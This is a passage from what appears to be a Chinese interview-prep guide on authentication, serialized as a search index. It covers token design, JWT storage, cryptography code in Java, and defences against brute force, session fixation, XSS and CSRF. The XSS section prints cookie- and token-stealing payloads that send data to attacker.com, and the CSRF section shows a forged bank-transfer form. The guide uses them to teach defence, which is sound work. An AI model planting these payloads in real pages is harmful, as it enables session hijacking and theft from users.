<pre><code>\u4f5c\u7528\uff1a\u5e73\u8861\u5b89\u5168\u6027\u548c\u7528\u6237\u4f53\u9a8c\n\n\u95ee\u9898\u573a\u666f\uff1a\n- Access Token\u77ed\u671f\uff0815\u5206\u949f\uff09\uff1a\u5b89\u5168\n- \u4f46\u7528\u6237\u9700\u8981\u9891\u7e41\u91cd\u65b0\u767b\u5f55\uff1a\u4f53\u9a8c\u5dee\n\n\u89e3\u51b3\u65b9\u6848\uff1a\u53ccToken\u673a\u5236\n\n\u67b6\u6784\uff1a\nAccess Token\uff1a\n- \u6709\u6548\u671f\uff1a\u77ed\uff085-15\u5206\u949f\uff09\n- \u7528\u9014\uff1a\u8bbf\u95ee\u53d7\u4fdd\u62a4\u8d44\u6e90\n- \u5b58\u50a8\uff1a\u5185\u5b58\u6216HttpOnly Cookie\n- \u4e0d\u53ef\u64a4\u9500\n\nRefresh Token\uff1a\n- \u6709\u6548\u671f\uff1a\u957f\uff087-30\u5929\uff09\n- \u7528\u9014\uff1a\u83b7\u53d6\u65b0\u7684Access Token\n- \u5b58\u50a8\uff1a\u6570\u636e\u5e93\uff08\u53ef\u64a4\u9500\uff09+ HttpOnly Cookie\uff08\u5ba2\u6237\u7aef\uff09\n- \u53ef\u64a4\u9500\n\n\u6d41\u7a0b\uff1a\n1. \u767b\u5f55 \u2192 \u8fd4\u56deAccess Token + Refresh Token\n2. \u8bbf\u95eeAPI \u2192 \u4f7f\u7528Access Token\n3. Access Token\u8fc7\u671f \u2192 \u4f7f\u7528Refresh Token\u6362\u65b0Token\n4. Refresh Token\u8fc7\u671f \u2192 \u91cd\u65b0\u767b\u5f55\n\n\u4f18\u52bf\uff1a\n- Access Token\u6cc4\u9732\u5f71\u54cd\u5c0f\uff08\u5f88\u5feb\u8fc7\u671f\uff09\n- Refresh Token\u53ef\u64a4\u9500\uff08\u767b\u51fa\u3001\u6362\u8bbe\u5907\uff09\n- \u7528\u6237\u4f53\u9a8c\u597d\uff08\u957f\u671f\u514d\u767b\u5f55\uff09\n\n\u9762\u8bd5\u52a0\u5206\u9879\uff1a\n- \u8bf4\u660eToken\u8f6e\u6362\uff08Refresh Token Rotation\uff09\n- \u63d0\u5230Sliding Window\u7b56\u7565\n- \u8bb2\u89e3\u79fb\u52a8\u7aef\u7684\u5b9e\u73b0\u5dee\u5f02\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#q5-jwt","title":"Q5: JWT\u5e94\u8be5\u5b58\u50a8\u5728\u54ea\u91cc\uff1f\u4e3a\u4ec0\u4e48\uff1f","text":"<p>\u56de\u7b54\u8981\u70b9\uff1a <pre><code>\u9009\u9879\u5bf9\u6bd4\uff1a\n\n1. localStorage\n   - \u4f18\u70b9\uff1a\u4f7f\u7528\u65b9\u4fbf\n   - \u7f3a\u70b9\uff1a\u5bb9\u6613\u88abXSS\u7a83\u53d6\n   - \u7ed3\u8bba\uff1a\u4e0d\u63a8\u8350\n\n2. sessionStorage\n   - \u4f18\u70b9\uff1a\u5173\u95ed\u6807\u7b7e\u81ea\u52a8\u6e05\u9664\n   - \u7f3a\u70b9\uff1a\u4ecd\u7136\u5bb9\u6613\u88abXSS\u7a83\u53d6\n   - \u7ed3\u8bba\uff1a\u4ec5\u7528\u4e8e\u4e34\u65f6Token\n\n3. HttpOnly Cookie\uff08\u63a8\u8350\uff09\n   - \u4f18\u70b9\uff1aJavaScript\u65e0\u6cd5\u8bbf\u95ee\uff0c\u9632XSS\n   - \u7f3a\u70b9\uff1a\u9700\u8981CSRF\u9632\u62a4\uff08SameSite\uff09\n   - \u7ed3\u8bba\uff1a\u6700\u63a8\u8350\n\n4. \u5185\u5b58\u53d8\u91cf\n   - \u4f18\u70b9\uff1a\u5b89\u5168\u6027\u6700\u9ad8\n   - \u7f3a\u70b9\uff1a\u5237\u65b0\u9875\u9762\u4e22\u5931\n   - \u7ed3\u8bba\uff1a\u9002\u5408SPA + \u81ea\u52a8\u5237\u65b0\u673a\u5236\n\n\u63a8\u8350\u65b9\u6848\uff1a\nWeb\u5e94\u7528\uff1a\n- Access Token\uff1a\u5185\u5b58 + \u81ea\u52a8\u5237\u65b0\n- Refresh Token\uff1aHttpOnly Cookie\n\n\u79fb\u52a8\u5e94\u7528\uff1a\n- Access Token\uff1a\u5185\u5b58\n- Refresh Token\uff1a\u52a0\u5bc6\u5b58\u50a8\uff08Keychain/EncryptedSharedPreferences\uff09\n\n\u5b89\u5168\u914d\u7f6e\uff1a\nSet-Cookie: access_token=xxx; \n  HttpOnly;         // \u9632XSS\n  Secure;           // \u4ec5HTTPS\n  SameSite=Strict;  // \u9632CSRF\n  Path=/;\n  Max-Age=900\n\n\u9762\u8bd5\u52a0\u5206\u9879\uff1a\n- \u5bf9\u6bd4\u4e0d\u540c\u5b58\u50a8\u65b9\u5f0f\u7684\u5b89\u5168\u6027\n- \u8bf4\u660eCSRF\u9632\u62a4\u63aa\u65bd\n- \u63d0\u5230\u79fb\u52a8\u7aef\u7684\u7279\u6b8a\u5904\u7406\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_13","title":"\u603b\u7ed3","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#session-vs-jwt","title":"Session vs JWT \u9009\u62e9\u51b3\u7b56\u6811","text":"<pre><code>\u5f00\u59cb\n  \u2502\n  \u251c\u2500 \u662f\u5fae\u670d\u52a1\u67b6\u6784\uff1f\n  \u2502   \u251c\u2500 \u662f \u2192 \u4f7f\u7528JWT\n  \u2502   \u2514\u2500 \u5426 \u2192 \u7ee7\u7eed\n  \u2502\n  \u251c\u2500 \u662f\u5426\u9700\u8981\u8de8\u57df\uff1f\n  \u2502   \u251c\u2500 \u662f \u2192 \u4f7f\u7528JWT\n  \u2502   \u2514\u2500 \u5426 \u2192 \u7ee7\u7eed\n  \u2502\n  \u251c\u2500 \u662f\u5426\u662f\u79fb\u52a8\u7aefAPI\uff1f\n  \u2502   \u251c\u2500 \u662f \u2192 \u4f7f\u7528JWT\n  \u2502   \u2514\u2500 \u5426 \u2192 \u7ee7\u7eed\n  \u2502\n  \u251c\u2500 \u662f\u5426\u9700\u8981\u9891\u7e41\u64a4\u9500\u4f1a\u8bdd\uff1f\n  \u2502   \u251c\u2500 \u662f \u2192 \u4f7f\u7528Session\n  \u2502   \u2514\u2500 \u5426 \u2192 \u4f7f\u7528JWT\n  \u2502\n  \u2514\u2500 \u5355\u4f53\u5e94\u7528 \u2192 \u4f7f\u7528Session\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_14","title":"\u6700\u4f73\u5b9e\u8df5\u6e05\u5355","text":"<p>Session\u6700\u4f73\u5b9e\u8df5\uff1a - \u2705 \u767b\u5f55\u540e\u91cd\u65b0\u751f\u6210SessionID - \u2705 \u8bbe\u7f6eHttpOnly\u3001Secure\u3001SameSite - \u2705 \u5206\u5e03\u5f0f\u7cfb\u7edf\u4f7f\u7528Redis\u5b58\u50a8 - \u2705 \u5b9e\u65bd\u8d85\u65f6\u7b56\u7565\uff08\u56fa\u5b9a+\u6ed1\u52a8\uff09 - \u2705 \u9650\u5236\u5e76\u53d1\u4f1a\u8bdd\u6570</p> <p>JWT\u6700\u4f73\u5b9e\u8df5\uff1a - \u2705 \u4f7f\u7528\u5f3a\u7b7e\u540d\u7b97\u6cd5\uff08HS256/RS256\uff09 - \u2705 \u8bbe\u7f6e\u5408\u7406\u7684\u8fc7\u671f\u65f6\u95f4\uff0815\u5206\u949f\uff09 - \u2705 \u5b9e\u65bdRefresh Token\u673a\u5236 - \u2705 Token\u5b58\u50a8\u5728HttpOnly Cookie\u6216\u5185\u5b58 - \u2705 \u4e0d\u5728Payload\u4e2d\u5b58\u653e\u654f\u611f\u4fe1\u606f - \u2705 \u9a8c\u8bc1\u6240\u6709\u6807\u51c6Claims\uff08exp, iss, aud\uff09 - \u2705 \u9632\u6b62\u7b97\u6cd5\u6df7\u6dc6\u653b\u51fb</p> <p>\u901a\u7528\u5b89\u5168\u5b9e\u8df5\uff1a - \u2705 \u5168\u7ad9HTTPS - \u2705 \u5b9e\u65bdCSRF\u9632\u62a4 - \u2705 \u9632\u6b62XSS\u653b\u51fb\uff08\u8f93\u5165\u9a8c\u8bc1\u3001\u8f93\u51fa\u7f16\u7801\uff09 - \u2705 \u65e5\u5fd7\u8bb0\u5f55\u548c\u76d1\u63a7 - \u2705 \u5b9a\u671f\u5b89\u5168\u5ba1\u8ba1</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_15","title":"\u5bc6\u7801\u5b66\u57fa\u7840","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#hash","title":"\u54c8\u5e0c\uff08Hash\uff09","text":"<p>**\u5b9a\u4e49\uff1a**\u5355\u5411\u51fd\u6570\uff0c\u5c06\u4efb\u610f\u957f\u5ea6\u6570\u636e\u8f6c\u6362\u4e3a\u56fa\u5b9a\u957f\u5ea6\u7684\u6458\u8981\uff0c\u4e0d\u53ef\u9006\u3002</p> <p>\u7279\u6027\uff1a - \u786e\u5b9a\u6027\uff1a\u76f8\u540c\u8f93\u5165\u4ea7\u751f\u76f8\u540c\u8f93\u51fa - \u4e0d\u53ef\u9006\uff1a\u65e0\u6cd5\u4ece\u54c8\u5e0c\u503c\u63a8\u5bfc\u539f\u59cb\u6570\u636e - \u96ea\u5d29\u6548\u5e94\uff1a\u8f93\u5165\u5fae\u5c0f\u53d8\u5316\u5bfc\u81f4\u8f93\u51fa\u5de8\u5927\u53d8\u5316 - \u6297\u78b0\u649e\uff1a\u96be\u4ee5\u627e\u5230\u4e24\u4e2a\u4e0d\u540c\u8f93\u5165\u4ea7\u751f\u76f8\u540c\u54c8\u5e0c\u503c</p> <p>\u5e38\u7528\u7b97\u6cd5\uff1a <pre><code>// MD5\uff08\u5df2\u4e0d\u5b89\u5168\uff0c\u4e0d\u63a8\u8350\uff09\nString md5 = DigestUtils.md5Hex(\"password\");\n\n// SHA-256\uff08\u5b89\u5168\uff0c\u4f46\u4e0d\u9002\u5408\u5bc6\u7801\u5b58\u50a8\uff09\nString sha256 = DigestUtils.sha256Hex(\"password\");\n\n// BCrypt\uff08\u63a8\u8350\u7528\u4e8e\u5bc6\u7801\u5b58\u50a8\uff0c\u81ea\u5e26\u76d0\u503c\u548c\u6210\u672c\u56e0\u5b50\uff09\nString bcrypt = BCrypt.hashpw(\"password\", BCrypt.gensalt(12));\n\n// Argon2\uff08\u6700\u65b0\u63a8\u8350\uff0c2015\u5e74\u5bc6\u7801\u54c8\u5e0c\u5927\u8d5b\u51a0\u519b\uff09\nArgon2 argon2 = Argon2Factory.create();\nString hash = argon2.hash(10, 65536, 1, \"password\");\n</code></pre></p> <p>\u5bc6\u7801\u5b58\u50a8\u6700\u4f73\u5b9e\u8df5\uff1a <pre><code>public class PasswordService {\n\n    /**\n     * \u5bc6\u7801\u52a0\u5bc6\u5b58\u50a8\n     * \u4f7f\u7528BCrypt\uff0c\u81ea\u52a8\u6dfb\u52a0\u76d0\u503c\n     */\n    public String encodePassword(String plainPassword) {\n        // cost factor = 12, 2^12 = 4096 \u8f6e\n        return BCrypt.hashpw(plainPassword, BCrypt.gensalt(12));\n    }\n\n    /**\n     * \u5bc6\u7801\u9a8c\u8bc1\n     */\n    public boolean verifyPassword(String plainPassword, String hashedPassword) {\n        return BCrypt.checkpw(plainPassword, hashedPassword);\n    }\n}\n\n// \u6570\u636e\u5e93\u5b58\u50a8\u793a\u4f8b\n// \u539f\u59cb\u5bc6\u7801: \"myPassword123\"\n// \u5b58\u50a8\u503c: \"$2a$12$R9h/cIPz0gi.URNNX3kh2OPST9/PgBkqquzi.Ss7KIUgO2t0jWMUW\"\n//         ^^^ ^^  ^^^^^^^^^^^^^^^^^^^^^^^  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^\n//         |   |   |                        |\n//         |   |   |                        +-- \u54c8\u5e0c\u503c(31\u5b57\u7b26)\n//         |   |   +-- \u76d0\u503c(22\u5b57\u7b26)\n//         |   +-- cost factor\n//         +-- \u7b97\u6cd5\u6807\u8bc6(2a = BCrypt)\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#encryption","title":"\u52a0\u5bc6\uff08Encryption\uff09","text":"<p>**\u5b9a\u4e49\uff1a**\u53cc\u5411\u8f6c\u6362\uff0c\u53ef\u4ee5\u89e3\u5bc6\u8fd8\u539f\u539f\u59cb\u6570\u636e\u3002</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_16","title":"\u5bf9\u79f0\u52a0\u5bc6","text":"<p>**\u7279\u70b9\uff1a**\u52a0\u5bc6\u548c\u89e3\u5bc6\u4f7f\u7528\u76f8\u540c\u5bc6\u94a5\u3002</p> <p>\u5e38\u7528\u7b97\u6cd5\uff1a - AES\uff08Advanced Encryption Standard\uff09\uff1a\u6700\u5e38\u7528\uff0c\u5b89\u5168\u6027\u9ad8 - DES\uff08\u5df2\u6dd8\u6c70\uff09\u30013DES\uff08\u9010\u6b65\u6dd8\u6c70\uff09</p> <pre><code>/**\n * AES\u52a0\u5bc6\u793a\u4f8b\n */\npublic class AESEncryption {\n\n    private static final String ALGORITHM = \"AES/GCM/NoPadding\";\n    private static final int KEY_SIZE = 256; // 256\u4f4d\u5bc6\u94a5\n\n    /**\n     * \u52a0\u5bc6\u6570\u636e\n     */\n    public byte[] encrypt(String plaintext, SecretKey key) throws Exception {\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, generateIV());\n        cipher.init(Cipher.ENCRYPT_MODE, key, parameterSpec);\n        return cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));\n    }\n\n    /**\n     * \u89e3\u5bc6\u6570\u636e\n     */\n    public String decrypt(byte[] ciphertext, SecretKey key, byte[] iv) \n            throws Exception {\n        Cipher cipher = Cipher.getInstance(ALGORITHM);\n        GCMParameterSpec parameterSpec = new GCMParameterSpec(128, iv);\n        cipher.init(Cipher.DECRYPT_MODE, key, parameterSpec);\n        byte[] plaintext = cipher.doFinal(ciphertext);\n        return new String(plaintext, StandardCharsets.UTF_8);\n    }\n\n    /**\n     * \u751f\u6210\u968f\u673aIV\uff08\u521d\u59cb\u5316\u5411\u91cf\uff09\n     */\n    private byte[] generateIV() {\n        byte[] iv = new byte[12]; // GCM\u6a21\u5f0f\u63a8\u835012\u5b57\u8282\n        new SecureRandom().nextBytes(iv);\n        return iv;\n    }\n}\n</code></pre> <p>\u5e94\u7528\u573a\u666f\uff1a - \u6570\u636e\u5e93\u654f\u611f\u5b57\u6bb5\u52a0\u5bc6\uff08\u8eab\u4efd\u8bc1\u3001\u94f6\u884c\u5361\u53f7\uff09 - \u914d\u7f6e\u6587\u4ef6\u52a0\u5bc6 - \u4f20\u8f93\u5c42\u52a0\u5bc6\uff08TLS/SSL\uff09</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_17","title":"\u975e\u5bf9\u79f0\u52a0\u5bc6","text":"<p>**\u7279\u70b9\uff1a**\u4f7f\u7528\u516c\u94a5\u52a0\u5bc6\uff0c\u79c1\u94a5\u89e3\u5bc6\uff08\u6216\u53cd\u4e4b\uff09\u3002</p> <p>\u5e38\u7528\u7b97\u6cd5\uff1a - RSA\uff1a\u6700\u5e38\u7528\uff0c\u9002\u5408\u52a0\u5bc6\u548c\u7b7e\u540d - ECC\uff08\u692d\u5706\u66f2\u7ebf\uff09\uff1a\u66f4\u77ed\u7684\u5bc6\u94a5\u957f\u5ea6\uff0c\u76f8\u540c\u5b89\u5168\u6027</p> <pre><code>/**\n * RSA\u52a0\u5bc6\u793a\u4f8b\n */\npublic class RSAEncryption {\n\n    /**\n     * \u751f\u6210\u5bc6\u94a5\u5bf9\n     */\n    public KeyPair generateKeyPair() throws Exception {\n        KeyPairGenerator generator = KeyPairGenerator.getInstance(\"RSA\");\n        generator.initialize(2048); // 2048\u4f4d\u5bc6\u94a5\n        return generator.generateKeyPair();\n    }\n\n    /**\n     * \u516c\u94a5\u52a0\u5bc6\n     */\n    public byte[] encrypt(String plaintext, PublicKey publicKey) \n            throws Exception {\n        Cipher cipher = Cipher.getInstance(\"RSA/ECB/OAEPWithSHA-256AndMGF1Padding\");\n        cipher.init(Cipher.ENCRYPT_MODE, publicKey);\n        return cipher.doFinal(plaintext.getBytes(StandardCharsets.UTF_8));\n    }\n\n    /**\n     * \u79c1\u94a5\u89e3\u5bc6\n     */\n    public String decrypt(byte[] ciphertext, PrivateKey privateKey) \n            throws Exception {\n        Cipher cipher = Cipher.getInstance(\"RSA/ECB/OAEPWithSHA-256AndMGF1Padding\");\n        cipher.init(Cipher.DECRYPT_MODE, privateKey);\n        byte[] plaintext = cipher.doFinal(ciphertext);\n        return new String(plaintext, StandardCharsets.UTF_8);\n    }\n}\n</code></pre> <p>\u5e94\u7528\u573a\u666f\uff1a - \u6570\u5b57\u7b7e\u540d - \u5bc6\u94a5\u4ea4\u6362 - SSL/TLS\u63e1\u624b - JWT\u7b7e\u540d\uff08RS256\u7b97\u6cd5\uff09</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_18","title":"\u6570\u5b57\u7b7e\u540d","text":"<p>**\u5b9a\u4e49\uff1a**\u4f7f\u7528\u79c1\u94a5\u5bf9\u6570\u636e\u8fdb\u884c\u7b7e\u540d\uff0c\u4ed6\u4eba\u53ef\u7528\u516c\u94a5\u9a8c\u8bc1\u7b7e\u540d\uff0c\u786e\u4fdd\u6570\u636e\u5b8c\u6574\u6027\u548c\u6765\u6e90\u771f\u5b9e\u6027\u3002</p> <p>\u6d41\u7a0b\uff1a <pre><code>\u7b7e\u540d\u751f\u6210\uff1a\n1. \u5bf9\u539f\u59cb\u6570\u636e\u8fdb\u884c\u54c8\u5e0c\u8ba1\u7b97\n2. \u4f7f\u7528\u79c1\u94a5\u5bf9\u54c8\u5e0c\u503c\u52a0\u5bc6 \u2192 \u7b7e\u540d\n\n\u7b7e\u540d\u9a8c\u8bc1\uff1a\n1. \u5bf9\u539f\u59cb\u6570\u636e\u8fdb\u884c\u54c8\u5e0c\u8ba1\u7b97\n2. \u4f7f\u7528\u516c\u94a5\u89e3\u5bc6\u7b7e\u540d \u2192 \u5f97\u5230\u54c8\u5e0c\u503c\n3. \u6bd4\u8f83\u4e24\u4e2a\u54c8\u5e0c\u503c\u662f\u5426\u4e00\u81f4\n</code></pre></p> <pre><code>/**\n * \u6570\u5b57\u7b7e\u540d\u793a\u4f8b\n */\npublic class DigitalSignature {\n\n    /**\n     * \u751f\u6210\u7b7e\u540d\n     */\n    public byte[] sign(String data, PrivateKey privateKey) throws Exception {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initSign(privateKey);\n        signature.update(data.getBytes(StandardCharsets.UTF_8));\n        return signature.sign();\n    }\n\n    /**\n     * \u9a8c\u8bc1\u7b7e\u540d\n     */\n    public boolean verify(String data, byte[] signatureBytes, PublicKey publicKey) \n            throws Exception {\n        Signature signature = Signature.getInstance(\"SHA256withRSA\");\n        signature.initVerify(publicKey);\n        signature.update(data.getBytes(StandardCharsets.UTF_8));\n        return signature.verify(signatureBytes);\n    }\n}\n</code></pre> <p>\u5e94\u7528\u573a\u666f\uff1a - JWT\u7b7e\u540d - API\u8bf7\u6c42\u7b7e\u540d - \u8f6f\u4ef6\u5305\u5b8c\u6574\u6027\u9a8c\u8bc1 - \u533a\u5757\u94fe\u4ea4\u6613</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#_19","title":"\u5e38\u89c1\u653b\u51fb\u65b9\u5f0f\u4e0e\u9632\u62a4","text":""},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#1-brute-force-attack","title":"1. \u66b4\u529b\u7834\u89e3\u653b\u51fb\uff08Brute Force Attack\uff09","text":"<p>\u653b\u51fb\u65b9\u5f0f\uff1a - \u5c1d\u8bd5\u6240\u6709\u53ef\u80fd\u7684\u5bc6\u7801\u7ec4\u5408 - \u4f7f\u7528\u5e38\u89c1\u5bc6\u7801\u5b57\u5178</p> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <pre><code>/**\n * \u767b\u5f55\u5931\u8d25\u6b21\u6570\u9650\u5236\n */\npublic class LoginAttemptService {\n\n    private LoadingCache&lt;String, Integer&gt; attemptsCache;\n\n    public LoginAttemptService() {\n        attemptsCache = CacheBuilder.newBuilder()\n            .expireAfterWrite(1, TimeUnit.DAYS)\n            .build(new CacheLoader&lt;String, Integer&gt;() {\n                public Integer load(String key) {\n                    return 0;\n                }\n            });\n    }\n\n    /**\n     * \u8bb0\u5f55\u767b\u5f55\u5931\u8d25\n     */\n    public void loginFailed(String username) {\n        int attempts = attemptsCache.getUnchecked(username);\n        attempts++;\n        attemptsCache.put(username, attempts);\n    }\n\n    /**\n     * \u68c0\u67e5\u662f\u5426\u88ab\u9501\u5b9a\n     */\n    public boolean isBlocked(String username) {\n        try {\n            return attemptsCache.get(username) &gt;= 5; // 5\u6b21\u5931\u8d25\u540e\u9501\u5b9a\n        } catch (ExecutionException e) {\n            return false;\n        }\n    }\n\n    /**\n     * \u767b\u5f55\u6210\u529f\uff0c\u91cd\u7f6e\u8ba1\u6570\n     */\n    public void loginSucceeded(String username) {\n        attemptsCache.invalidate(username);\n    }\n}\n</code></pre> <p>\u5176\u4ed6\u9632\u62a4\u624b\u6bb5\uff1a - \u5f3a\u5bc6\u7801\u7b56\u7565\uff08\u957f\u5ea6\u3001\u590d\u6742\u5ea6\u8981\u6c42\uff09 - \u9a8c\u8bc1\u7801\uff08CAPTCHA\uff09 - \u8d26\u6237\u9501\u5b9a\u7b56\u7565\uff08\u4e34\u65f6\u9501\u5b9a/\u6c38\u4e45\u9501\u5b9a\uff09 - \u5ef6\u8fdf\u54cd\u5e94\uff08\u968f\u7740\u5931\u8d25\u6b21\u6570\u589e\u52a0\u5ef6\u8fdf\u65f6\u95f4\uff09</p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#2-session-fixation","title":"2. \u4f1a\u8bdd\u56fa\u5b9a\u653b\u51fb\uff08Session Fixation\uff09","text":"<p>\u653b\u51fb\u6d41\u7a0b\uff1a <pre><code>1. \u653b\u51fb\u8005\u83b7\u53d6\u4e00\u4e2a\u6709\u6548\u7684SessionID\n2. \u8bf1\u9a97\u53d7\u5bb3\u8005\u4f7f\u7528\u8fd9\u4e2aSessionID\u767b\u5f55\n3. \u53d7\u5bb3\u8005\u767b\u5f55\u540e\uff0c\u653b\u51fb\u8005\u4f7f\u7528\u540c\u4e00SessionID\u8bbf\u95ee\n</code></pre></p> <p>\u9632\u62a4\u63aa\u65bd\uff1a <pre><code>/**\n * \u767b\u5f55\u540e\u91cd\u65b0\u751f\u6210SessionID\n */\npublic void onAuthenticationSuccess(HttpServletRequest request) {\n    HttpSession oldSession = request.getSession(false);\n    if (oldSession != null) {\n        // \u4fdd\u5b58\u65e7\u4f1a\u8bdd\u6570\u636e\n        Map&lt;String, Object&gt; attributes = new HashMap&lt;&gt;();\n        Enumeration&lt;String&gt; names = oldSession.getAttributeNames();\n        while (names.hasMoreElements()) {\n            String name = names.nextElement();\n            attributes.put(name, oldSession.getAttribute(name));\n        }\n\n        // \u4f7f\u65e7\u4f1a\u8bdd\u5931\u6548\n        oldSession.invalidate();\n    }\n\n    // \u521b\u5efa\u65b0\u4f1a\u8bdd\n    HttpSession newSession = request.getSession(true);\n\n    // \u6062\u590d\u4f1a\u8bdd\u6570\u636e\n    attributes.forEach(newSession::setAttribute);\n}\n</code></pre></p>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#3-xss-cross-site-scripting","title":"3. \u8de8\u7ad9\u811a\u672c\u653b\u51fb\uff08XSS - Cross-Site Scripting\uff09","text":"<p>\u653b\u51fb\u7c7b\u578b\uff1a</p> <ol> <li>\u5b58\u50a8\u578bXSS\uff1a\u6076\u610f\u811a\u672c\u5b58\u50a8\u5728\u670d\u52a1\u5668\uff08\u5982\u8bc4\u8bba\uff09</li> <li>\u53cd\u5c04\u578bXSS\uff1a\u6076\u610f\u811a\u672c\u5728URL\u53c2\u6570\u4e2d</li> <li>DOM\u578bXSS\uff1a\u901a\u8fc7\u4fee\u6539DOM\u6267\u884c\u811a\u672c</li> </ol> <p>\u653b\u51fb\u793a\u4f8b\uff1a <pre><code>&lt;!-- \u7528\u6237\u8f93\u5165 --&gt;\n&lt;script&gt;\n  document.location='http://attacker.com/steal?cookie='+document.cookie;\n&lt;/script&gt;\n\n&lt;!-- \u6216\u7a83\u53d6Token --&gt;\n&lt;img src=\"x\" onerror=\"fetch('http://attacker.com/steal', {\n  method: 'POST',\n  body: localStorage.getItem('token')\n})\"&gt;\n</code></pre></p> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <pre><code>/**\n * \u8f93\u51fa\u7f16\u7801\n */\npublic class XSSProtection {\n\n    /**\n     * HTML\u5b9e\u4f53\u7f16\u7801\n     */\n    public String encodeForHTML(String input) {\n        return StringEscapeUtils.escapeHtml4(input);\n        // &lt; \u8f6c\u6362\u4e3a &amp;lt;\n        // &gt; \u8f6c\u6362\u4e3a &amp;gt;\n        // \" \u8f6c\u6362\u4e3a &amp;quot;\n        // ' \u8f6c\u6362\u4e3a &amp;#x27;\n    }\n\n    /**\n     * JavaScript\u7f16\u7801\n     */\n    public String encodeForJavaScript(String input) {\n        return StringEscapeUtils.escapeEcmaScript(input);\n    }\n\n    /**\n     * URL\u7f16\u7801\n     */\n    public String encodeForURL(String input) {\n        return URLEncoder.encode(input, StandardCharsets.UTF_8);\n    }\n}\n</code></pre> <p>\u5176\u4ed6\u9632\u62a4\uff1a - Content Security Policy (CSP) \u5934 - HttpOnly Cookie\uff08\u9632\u6b62JavaScript\u8bbf\u95ee\uff09 - \u8f93\u5165\u9a8c\u8bc1\u548c\u8fc7\u6ee4 - \u4f7f\u7528\u5b89\u5168\u7684\u6a21\u677f\u5f15\u64ce\uff08\u81ea\u52a8\u8f6c\u4e49\uff09</p> <pre><code>// Spring Boot CSP\u914d\u7f6e\n@Configuration\npublic class SecurityHeadersConfig {\n    @Bean\n    public SecurityFilterChain filterChain(HttpSecurity http) throws Exception {\n        http.headers()\n            .contentSecurityPolicy(\"default-src 'self'; script-src 'self'\");\n        return http.build();\n    }\n}\n</code></pre>"},{"location":"auth/01-%E8%AE%A4%E8%AF%81%E6%8E%88%E6%9D%83%E5%9F%BA%E7%A1%80/#4-csrf-cross-site-request-forgery","title":"4. \u8de8\u7ad9\u8bf7\u6c42\u4f2a\u9020\uff08CSRF - Cross-Site Request Forgery\uff09","text":"<p>\u653b\u51fb\u6d41\u7a0b\uff1a <pre><code>1. \u7528\u6237\u767b\u5f55\u53ef\u4fe1\u7f51\u7ad9A\uff0c\u83b7\u5f97Cookie\n2. \u7528\u6237\u8bbf\u95ee\u6076\u610f\u7f51\u7ad9B\uff08\u672a\u9000\u51faA\uff09\n3. \u7f51\u7ad9B\u8fd4\u56de\u653b\u51fb\u4ee3\u7801\uff0c\u5411\u7f51\u7ad9A\u53d1\u8d77\u8bf7\u6c42\n4. \u6d4f\u89c8\u5668\u81ea\u52a8\u643a\u5e26\u7f51\u7ad9A\u7684Cookie\n5. \u7f51\u7ad9A\u6536\u5230\u8bf7\u6c42\uff0c\u4ee5\u4e3a\u662f\u7528\u6237\u771f\u5b9e\u64cd\u4f5c\n</code></pre></p> <p>\u653b\u51fb\u793a\u4f8b\uff1a <pre><code>&lt;!-- \u6076\u610f\u7f51\u7ad9B\u7684\u9875\u9762 --&gt;\n&lt;img src=\"https://bank.com/transfer?to=attacker&amp;amount=1000\" /&gt;\n\n&lt;!-- \u6216\u8005\u4f7f\u7528\u8868\u5355\u81ea\u52a8\u63d0\u4ea4 --&gt;\n&lt;form action=\"https://bank.com/transfer\" method=\"POST\"&gt;\n  &lt;input type=\"hidden\" name=\"to\" value=\"attacker\" /&gt;\n  &lt;input type=\"hidden\" name=\"amount\" value=\"1000\" /&gt;\n&lt;/form&gt;\n&lt;script&gt;document.forms[0].submit();&lt;/script&gt;\n</code></pre></p> <p>\u9632\u62a4\u63aa\u65bd\uff1a</p> <ol> <li>CSRF Token\uff08\u540c\u6b65\u4ee4\u724c\u6a21\u5f0f\uff09 <pre><code>/**\n * CSRF Token\u9a8c\u8bc1\n */\npublic class CSRFProtection {\n\n    /**\n     * \u751f\u6210CSRF Token\n     */\n    public String generateToken(HttpSession session) {\n        String token = UUID.randomUUID().toString();\n        session.setAttribute(\"CSRF_TOKEN\", token);\n        return token;\n    }\n\n    /**\n     * \u9a8c\u8bc1CSRF Token\n     */\n    public boolean validateToken(HttpServletRequest request) {\n        String sessionToken = (String) request.getSession()\n            .getAttribute(\"CSRF_TOKEN\");\n        String requestToken = 